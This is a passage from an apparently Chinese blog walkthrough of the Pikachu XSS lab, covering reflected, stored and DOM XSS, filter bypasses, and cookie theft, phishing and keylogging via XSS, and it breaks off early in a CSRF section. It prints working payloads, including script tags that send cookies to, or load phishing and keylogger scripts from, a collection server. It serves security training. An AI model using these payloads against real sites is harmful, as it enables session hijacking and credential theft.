<li>存储型xss：持久化代码是存储在服务器中的，如在注册账号个人信息或发表文章、留言版等地方插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。</li>
<li>反射型xss：非持久化存储代码,一次性，所见所得，需要欺骗用户自己去点击链接才能出发攻击（服务器中没有这种页面和内容），一般出现在web页面（查询页面），多用来盗取cookie。</li>
<li>dom型xss：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model，DOM)的一种漏洞，DOM-XSS是通过 url 传入参数去控制触发的，也是一次性的，其实也属于反射型XSS</li>
</ol>
<p><strong>xss形成原因</strong>是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<p><strong>xss的攻击载荷：</strong> script、svg、img、body、video、style标签<br><strong>xss可以插在哪里：</strong></p>
<ol>
<li>用户输入作为 script 标签内容</li>
<li>用户输入作为 html注释内容、标签的属性名和属性值、标签的名字（关键是要闭合标签）</li>
<li>直接插入到css中</li>
<li>最重要的是，千万不要引入任何不可信的第三方 JavaScript 到页面里！</li>
</ol>
<p><strong>xss的攻击流程：</strong></p>
<ol>
<li>在目标网站找到输入点如搜索框留言板等</li>
<li>输入一组”特殊字符+唯一识别字符”, 点击提交后,查看返回的源码，是否有做对应的处理</li>
<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件 (构造闭合)</li>
<li>提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞</li>
</ol>
<p>接口处一般为反射型，留言评论处一般为存储型，由于后台存在过滤构造的script可能过滤掉不生效，或者浏览器限制执行，尽量构造script绕过后台过滤。</p>
<h4 id="反射性xss（get-amp-post）学习"><a href="#反射性xss（get-amp-post）学习" class="headerlink" title="反射性xss（get&amp;post）学习"></a>反射性xss（get&amp;post）学习</h4><p>打开对应的靶场，在输入点输入特定的字符串如*;”‘&gt;&lt;666*，目的是为了查看是否会对输入的字符串进行过滤、输出、处理。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-29-09.png" alt="测试是否处理" class="lazyload"><br>查看源码我们发现并没有对字符串处理直接原样输出：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-32-04.png" alt="源码" class="lazyload"><br>我们输入正确的javascript代码看是否会原样输出：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-40-21.png" alt="输入" class="lazyload"><br>还没输入完但是输入不了了，原因是对长度进行了限制。这是在前端的安全设置，意义不是很大。兵来将挡水来土掩，在设置中打开web开发者工具，查找输入框语句，修改并扩大输入框限制，并继续输入代码。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-38-13.png" alt="扩大限制" class="lazyload"><br>输入代码：<code>&lt;script&gt;alert(&#39;a&#39;)&lt;/script&gt;</code>然后点击提交，我们可以看到输入的代码执行了并且出现了xss弹窗。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-14-42-23.png" alt="代码执行" class="lazyload"><br>因为是反射性，一次性的，刷新页面之后弹窗消失。这个xss实际上是以get的方式提交的。<br><strong>get和post</strong> 提交方式的区别为get实在url中作为参数提交，在url中可以看到，而post提交是以表单的方式提交在url中看不到。GET方式的XSS漏洞更加容易被利用, 一般利用的方式是将带有跨站脚本的URL伪装后发送给目标，而POST方式由于是以表单方式提交,无法直接使用URL方式进行攻击。<br>post方式的靶场和get方式差不多，只不过我们需要先登录才能看到靶场测是的输入点，以post方式在url中看不到提交的参数，我们可通过hackbr查看post方式的参数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-03-40.png" alt="post的反射性xss" class="lazyload"></p>
<h4 id="存储型xss学习"><a href="#存储型xss学习" class="headerlink" title="存储型xss学习"></a>存储型xss学习</h4><p>存储型xss与反射型xss形成的原因不同，存储型xss将攻击者的脚本注入到后台数据库中永久化存储，构成更加持久的威胁也被称为永久型xss。<br>打开存储型的靶场我们在留言板上试着留言666如图所示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-18-02.png" alt="留言" class="lazyload"><br>可以看到在mysql数据库的pikachu的message表中有相关信息，实现了永久化存储<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-19-25.png" alt="数据库信息" class="lazyload"><br>再次输入一条信息还能显示，确实存储在了后台数据库中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-20-38.png" alt="第二次输入信息" class="lazyload"><br>按照先前的思路，我们先测试这个留言版中是否存在xss，先输入特殊字符<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-23-41.png" alt="特殊字符" class="lazyload"><br>查看源码并未做特殊处理直接输出<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-25-32.png" alt="源码" class="lazyload"><br>我们输入一个payload，一个弹窗，提交后我们发现出现了弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-30-43.png" alt="测试" class="lazyload"><br>我们刷新页面发现弹窗仍然存在在后台数据库中也能看到相关payload<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-34-24.png" alt="永久化" class="lazyload"><br>与反射型手法差不多，唯一区别就是永久性和一次性</p>
<h4 id="dom型Xss学习"><a href="#dom型Xss学习" class="headerlink" title="dom型Xss学习"></a>dom型Xss学习</h4><p>DOM：通过html Dom和JavaScript可以访问和改变html文档的所有元素，文档对象模型即dom，在浏览器加载网页时会创建这个对象<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-15-56-44.png" alt="dom" class="lazyload"><br>通过JavaScript可以重构整个html，JavaScript要通过dom这个对象来选择html中的元素来进行修改，可以把dom想象成一个接口。<br>打开dom型xss我们来进行学习：<br>我们在输入框中输入一串字符，点击查看效果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-07-54.png" alt="输入字符" class="lazyload"><br>显示what do you see？可以打开源码查看做了什么<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-14-13.png" alt="源码" class="lazyload"><br>可以看到输入框中输入的能容拼接入一个a标签，判断此处是否有xss漏洞，与之前思路一样。先确认输入点，输入就是input也就是输入框。输出的话DOM是纯前端操作，输出也是前端输出。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-18-27.png" alt="代码" class="lazyload"><br>红框选中的str即为我们在文本框中输入的字符串，将这句拼接的话拿出来单独分析,利用输入构造一个闭合</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们依旧构造一个弹窗在输入框中输入：<code>#&#39; onclick=&quot;alert(&#39;a&#39;)&quot;&gt;</code><br>构成a标签闭合且加了一个弹窗：<code>&lt;a href=&#39;#&#39; onclick=&quot;alert(&#39;a&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code><br>点击一下a标签会出现弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-29-39.png" alt="测试" class="lazyload"><br>有点小瑕疵但可以执行。</p>
<h4 id="dom型xss-x学习"><a href="#dom型xss-x学习" class="headerlink" title="dom型xss-x学习"></a>dom型xss-x学习</h4><p>这是一个例外，在输入框输入字符串并提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-16-34-10.png" alt="输入" class="lazyload"><br>同样查看源码，看看是什么操作，<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-17-12-22.png" alt="代码" class="lazyload"><br>这个的输入实际上是从url中获取的，类似与反射型，我们依旧对a标签进行闭合输入<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-17-16-06.png" alt="出现弹窗" class="lazyload"><br>点击提交产生了弹窗</p>
<h4 id="xss盲打和原理分析"><a href="#xss盲打和原理分析" class="headerlink" title="xss盲打和原理分析"></a>xss盲打和原理分析</h4><p>xss盲打指的是一种攻击场景，就是从前端输入的数据只能在后台看到前端页面不会展示，从前端无法判断是否存在xss。操作方法不管前端页面分返回直接往输入点插xss代码然后等待看看是否可以撞大运获取到信息。由于是后台管理页面，安全考虑不严格登录的时候就会被x。<br>打开xss盲打进行学习：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-45-29.png" alt="盲打" class="lazyload"><br>我们在前端输入了xss代码<code>&lt;script&gt;alert(&#39;xni&#39;)&lt;/script&gt;</code>,点击了提交，在前端页面并没有显示，也就是说只能在后台管理页面才可以看到。我们使用管理员账号密码登录后台管理页面看看我们输入的弹窗代码是否会执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-52-10.png" alt="后台登录" class="lazyload"><br>输入用户名密码点击登录查看是否有弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-18-54-17.png" alt="出现弹窗" class="lazyload"><br>管理员被x到，这种情况就是xss盲打，对攻击者来说只是尝试的输入，并不知道后台是否被输出，只是尝试的输入跨站脚本。管理员被x到，攻击者成功。这种危害比较大，如果在前端输入一段盗取cookie的脚本，管理员一登陆，管理员的cookie就会被获取。攻击者就可以伪装管理员登陆后台，后台的权限就大了。</p>
<h4 id="xss的绕过和过滤（filter-amp-htmlspecialchars）"><a href="#xss的绕过和过滤（filter-amp-htmlspecialchars）" class="headerlink" title="xss的绕过和过滤（filter&amp;htmlspecialchars）"></a>xss的绕过和过滤（filter&amp;htmlspecialchars）</h4><p><strong>xss绕过-过滤-转换</strong></p>
<ul>
<li>前端限制绕过，直接抓包重放，或者修改前端html代码</li>
<li>大小写，如:  <code>&lt;SCRIPT&gt; aLeRT(111)&lt;/sCRIpt&gt;</code></li>
<li>拼凑：<code>&lt;scri&lt;script&gt; pt&gt; alert(111)&lt;/scri&lt;/script&gt; pt&gt;</code></li>
<li>使用注释进行干扰:<code>&lt;scri&lt;!--....--&gt; pt&gt; alert(111)&lt;/sc &lt;--test--&gt; ript&gt;</code></li>
<li><em>xss绕过-过滤-编码</em>*<br>核心思路：后台过滤了特殊字符比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后端不一定会过滤，当浏览器对改编码进行识别时会正常翻译从而执行，在使用编码时需注意编码在输出点是否会被正常识别和翻译<br>例子：<code>&lt; img src=x onerror=”alert( xss )&quot;</code>将alert( xss )进行url编码可以执行吗？</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;img src=x onerror= <span class="hljs-string">&quot; alert%28%27xss%27%29&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>

<p>不可以，因为标签属性不会正常解析这些编码<br>例子：使用事件属性onxx();</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;img src=x onerror=<span class="hljs-string">&quot; alert(&#x27;xss&#x27;)&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>

<p>可以把alert(“xss )进行html编码,可以执行.事件标签里面并不会执行标签里面的代码。<br><strong>XSS绕过的姿势有很多取决于你的思路和对前端技术的掌握程度</strong><br>打开xss之过滤我们随意输入字符串：<code>&lt;script&gt;;&#39;#@</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-37-26.png" alt="xss过滤" class="lazyload"><br>查看源码发现我们输入的字符串中scrpit标签被过滤了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-39-20.png" alt="源码" class="lazyload"><br>尝试大小写绕过<code>&lt;scRIPt&gt;alert(666)&lt;/ScrIpt&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-41-18.png" alt="成功" class="lazyload"><br>成功弹窗，也可以换别的标签<code>&lt;img src=x onerror=&quot;alert(666)&quot;&gt;</code>绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-42-55.png" alt="弹窗" class="lazyload"><br>成功弹窗<br><strong>XSS绕过关于htmlspecialchars()函数</strong><br>htmlspecialchars()函数把预定义的字符转换为HTML实体,预定义的字符是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">&amp;(和号)成为&amp;<br>“(双引号)成为”<br>‘(单引号)成为’<br>&lt;(小于)成为&lt;<br>‘&gt;’(大于)成为&gt;<br></code></pre></td></tr></table></figure>

<p>可用的引号类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">ENT_ COMPAT -默认。仅编码双引号。<br>ENT QUOTES -编码双引号和单引号。<br>ENT NOQUOTES -不编码任何引号。<br></code></pre></td></tr></table></figure>

<p>打开xss之htmlspecialchars输入字符串66666’“&lt;&gt;#$%查看返回页面信息和源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-20-52-26.png" alt="输入字符串" class="lazyload"><br>提交后查看页面源码<br><code>&lt;a href=&quot;66666’“&lt;&gt;#$%&quot;&gt;66666’“&amp;lt;&amp;gt;#$%&lt;/a&gt;</code><br>可以发现除了单引号其他特殊字符都进行了特殊编码，可以构造<code>q&#39; onclick=&#39;alert(666)&#39;</code>对前边的单引号闭合，点击提交然后点击记录出现弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-11-01.png" alt="弹窗" class="lazyload"></p>
<p><strong>XSS输出在href和js中的案例分析</strong><br>打开xss之herf，输入Javascript:alert(666)，不含有特殊字符<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-13-18.png" alt="测试" class="lazyload"><br>打开源码查看</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;Javascript:alert(666)&quot;</span>&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在a标签的herf中，我们返回页面点击返回的蓝色字体<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-16-07.png" alt="点击蓝字" class="lazyload"><br>alert被执行，出现弹窗。在这里我们可以做出相应防范，只允许http,https，其次在进行htmlspecialchars处理。<br>打开xss之js，我们随意输入然后查看页内原码。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-19-20.png" alt="源码" class="lazyload"><br>我们输入tmac<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-22-31.png" alt="tmac" class="lazyload"><br>我们尝试造成闭合输入<code>x&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>先将前面的script闭合再插入我们自己的语句<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-24-29.png" alt="造成闭合" class="lazyload"><br>出现弹窗，查看代码可以看到确实闭合了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-10-21-26-17.png" alt="代码闭合" class="lazyload"></p>
<h4 id="xss危害：获取cookie的原理和危害"><a href="#xss危害：获取cookie的原理和危害" class="headerlink" title="xss危害：获取cookie的原理和危害"></a>xss危害：获取cookie的原理和危害</h4><p>get型xss的利用（将恶意代码装到url中发送给用户用户访问后盗取信息）：<br>首先我们需要打开皮卡丘靶场的xss后台进行登录查看收集的数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-17-52-58.png" alt="xss后台" class="lazyload"><br>可以看到cookie数据为空<br>然后打开反射型xss的get型，首先我们先解决字符长度，然后我们写入一个比较复杂的payload，目的是获取本地cookie发送给xss后台</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">payload为：&lt;script&gt;<span class="hljs-built_in">document</span>.location = <span class="hljs-string">&#x27;http://xss平台的ip/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> +<span class="hljs-built_in">document</span>.cookie;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>这里的payload需要自己修改一下这个文件文件，这里是在虚拟机里边搭建的，都改成虚拟机的IP地址即可，这里需要注意文件路径<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-36-24.png" alt="文件修改" class="lazyload"><br>配置好后将payload输入靶场进行演示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-43-43.png" alt="步骤" class="lazyload"></p>
<p>post型xss利用：<br>输入账号密码登录，页面跳转，输入字符，不难发现并没有在url中提交参数。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-55-48.png" alt="参数" class="lazyload"><br>可以打开hackbar来查看提交的参数使用message来传递的<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-18-57-18.png" alt="post参数" class="lazyload"><br>message是通过请求体返回，通过post方式传到后台。这样的话是不能把恶意代码嵌入url中。<br>POST型XSS获取cookie原理（将伪造的页面链接发送给用户）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-01-00.png" alt="post型原理" class="lazyload"><br>需要自己搭一个恶意站点，然后在网站上放一个post表单，将存放POST表单的链接发送给受害者，诱导受害者点击。 这个POST表单会自动向漏洞服务器提交一个POST请求，实现受害者帮我们提交POST请求的目的。我们只需要诱导受害者点击上面的链接就能窃取用户的Cookie。<br>post型演示：<br>演示之前首先要修改这个文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-34-53.png" alt="修改" class="lazyload"><br>演示：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-19-55-13.png" alt="演示" class="lazyload"><br>可以看到成功获取到cookie</p>
<h4 id="xss危害-XSS进行钓鱼的原理和演示"><a href="#xss危害-XSS进行钓鱼的原理和演示" class="headerlink" title="xss危害-XSS进行钓鱼的原理和演示"></a>xss危害-XSS进行钓鱼的原理和演示</h4><p>钓鱼的思路（存储型xss，存储到服务器然后用户输）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-04-12.png" alt="思路" class="lazyload"><br>攻击者制作一个钓鱼登录页面，人后通过存储型xss漏洞将页面展示到网站中，用户防护意识不强的话将账号密码填入发送，钓鱼成功<br>演示：<br>首先需要修改文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-10-06.png" alt="修改文件" class="lazyload"><br>演示打开钓鱼后台，打开存储型xss，输入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;http://192.168.23.128/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>(这里的src中的网址问xss平台的网址)页面会出现弹窗，输入账号密码。当页面刷新时依然存在弹窗，所有访问者都会遇到弹窗，输入账号密码后，数据被存入后台，打开xss后台即可查看钓鱼数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-17-18.png" alt="演示" class="lazyload"></p>
<h4 id="XSS危害XSS获取键盘记录原理和演示"><a href="#XSS危害XSS获取键盘记录原理和演示" class="headerlink" title="XSS危害XSS获取键盘记录原理和演示"></a>XSS危害XSS获取键盘记录原理和演示</h4><p>首先要理解跨域<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-38-00.png" alt="跨域" class="lazyload"><br>当协议、主机(主域名，子域名)、端口中的任意一一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。<br><strong>跨域同源策略</strong> 为了安全考虑，所有的浏览器都约定了<strong>同源策略</strong>， 同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。如果想要跨域操作,则需要管理员进行特殊的配置。比如通过: header( “Access -Control Allow- Origin:x.com” )指定。<br>Tips:下面这些标签跨域加载资源(资源类型是有限制的)是不受同源策略限制的。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-42-08.png" alt="tips" class="lazyload"><br>演示之前需要修改文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-46-47.png" alt="修改" class="lazyload"><br>演示：<br>打开存储型xss，我们输入payload来加载xss平台的js代码插入到页面</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;http://192.168.23.128/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-21-13-19.png" alt="演示" class="lazyload"></p>
<p>解决跨域请求页面问题<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-56-27.png" alt="跨域" class="lazyload"><br>修改页面重启服务清空浏览器缓存，重新输入查看键盘记录<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-21-28-28.png" alt="成功记录" class="lazyload"></p>
<h4 id="XSS常见防范措施"><a href="#XSS常见防范措施" class="headerlink" title="XSS常见防范措施"></a>XSS常见防范措施</h4><p>总的原则:输入做过滤,输出做转义：</p>
<ul>
<li>过滤:根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字</li>
<li>转义:所有输出到前端的数据都根据输出点进行转义,比如输出到html中进行htm|实体转义,输入到JS里面的进行js转义。</li>
</ul>
<h3 id="CSRF（跨站请求伪造漏洞）"><a href="#CSRF（跨站请求伪造漏洞）" class="headerlink" title="CSRF（跨站请求伪造漏洞）"></a>CSRF（跨站请求伪造漏洞）</h3><h4 id="csrf漏洞概述"><a href="#csrf漏洞概述" class="headerlink" title="csrf漏洞概述"></a>csrf漏洞概述</h4><p>cross-site request forgery（csrf跨站请求伪造）。在csrf攻击中，攻击者会伪造一个请求（一般是一个链接），欺骗用户点击，用户一旦点击整个攻击就完成了，所以也叫one click攻击。<br>例子：A用户在某网站的信息修改页面修改完信息点击提交即可修改成功，修改的链接地址为：<a href="http://#/csrf_mem_">http://#/csrf_mem_</a> edit.php?sex= 女&amp;phonenum= 12345678922&amp;add=地球村504号&amp;email=lucy@pi ka’ chu.com&amp;submit=submit<br>这时攻击者B想修改A的用户信息如何完成？必须需要有A的权限，修改个人信息的请求<br>攻击者B注册该网站抓包获取到修改信息的请求，然后伪造一个请求地址为<a href="http://#/csrf">http://#/csrf</a> mem. edit.php?sex=女&amp;phonenum= 13856564455&amp;add=火星村111号&amp;email=<a href="mailto:&#x6c;&#x75;&#x63;&#121;&#x40;&#112;&#105;&#x6b;&#x61;&#x63;&#104;&#117;&#x2e;&#99;&#x6f;&#109;">&#x6c;&#x75;&#x63;&#121;&#x40;&#112;&#105;&#x6b;&#x61;&#x63;&#104;&#117;&#x2e;&#99;&#x6f;&#109;</a>&amp;tsubmit=submit引诱A在登录的情况下点击，此时攻击就完成了。<br><strong>攻击成功的条件</strong></p>
<ol>
<li>网站对个人信息修改的请求没有做csrf处理，导致该请求容易伪造。因此在判断一个网站是否存在csrf漏洞其实就是判断其对关键信息的操作（增删改）是否易伪造</li>
<li>A要登录的情况下点击伪造请求，若未登录或没有点击伪造请求链接则攻击不会成功</li>
</ol>
<p><strong>csrf和xss的区别</strong></p>
<ul>
<li>如果攻击者B在网页中发现了xss漏洞他的做法是：</li>
</ul>
<ol>
<li>欺骗A访问埋伏了xss脚本（盗取cookie信息的脚本）的页面</li>
<li>A中招，B获取到A的cookie</li>
<li>B顺利登录到A的后台进行修改</li>
</ol>
<ul>
<li>csrf是借用用户权限完成攻击，攻击者并没有获取到用户权限，而xss是直接获取到用户权限进行破坏。</li>
</ul>
<p>如何确认一个web系统是否存在csrf漏洞：</p>
<ol>
